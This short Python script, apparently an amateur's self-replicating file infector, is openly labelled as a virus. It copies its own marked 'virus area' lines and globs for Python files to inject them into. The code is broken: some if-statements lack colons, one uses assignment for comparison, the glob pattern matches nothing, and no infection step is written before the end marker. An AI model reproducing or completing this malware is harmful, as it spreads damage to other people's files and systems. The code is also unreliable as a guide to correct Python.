#Flag Start#

#code will be injected into other files, will be replicated

import glob
import sys

code = [] # the code of the current file - list that is empty
#opening the file name that the current code/script has in reading mode
with open(sys.argv[0], 'r') as File:
    lines = File.readlines()

#Virus Code Area

virus_area_check = False
for line in lines:
    #checks if we are in the virus area
    if line == '#Flag Start#\n'
        virus_area_check = True
    if virus_area_check == True:
        #if we are in the virus area we append the current line
        code.append(line)
    if line = '#Flag End#\n'
        #we are not in the virus area anymore. Stops when we reach the end
        break

#the code that will infect python files/scripts

#using glob which basically finds all the files with .py extension in the current folder
python_files = glob.glob('.py')

#Flag End#